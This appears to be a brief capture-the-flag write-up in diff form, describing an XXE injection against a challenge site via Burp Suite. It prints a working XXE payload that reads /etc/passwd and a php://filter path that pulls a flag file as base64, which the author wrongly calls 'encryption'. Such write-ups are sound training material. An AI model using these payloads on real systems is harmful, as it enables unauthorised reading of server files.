@@ -1,0 +1,29 @@
+All we see here is this button
+ 
+After clicking on it we got such answer
+ 
+But the problem is that we got no place to make an input. And it’s really good for us, because it is a hint that we need to use burp suite for that
+So let’s try to use xxe injection
+Firstly we need to open barp suite 
+ 
+Let’s send it to a repeater so we won’t spend a lot of time in no use
+So all we need to do right now is to put some script below so we will get our flag
+ 
+Let’s try this one
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [
+<!ELEMENT foo ANY>
+ <!ENTITY xxe SYSTEM
+ "file:///etc/passwd">
+ ]>
+ <foo>
+&xxe;
+ </foo>
+Still we got no flag, so now we know that we need to modify our path to get the flag. We need to use encryption, because this website doesn’t send any packets without encryption, so let’s try this one
+php://filter/convert.base64-encode/resource=/var/www/html/flag
+
+ 
+ 
+This is our flag, but it is encrypted so let’s decrypt it with burp suite decoder
+And here is our answer
+ 
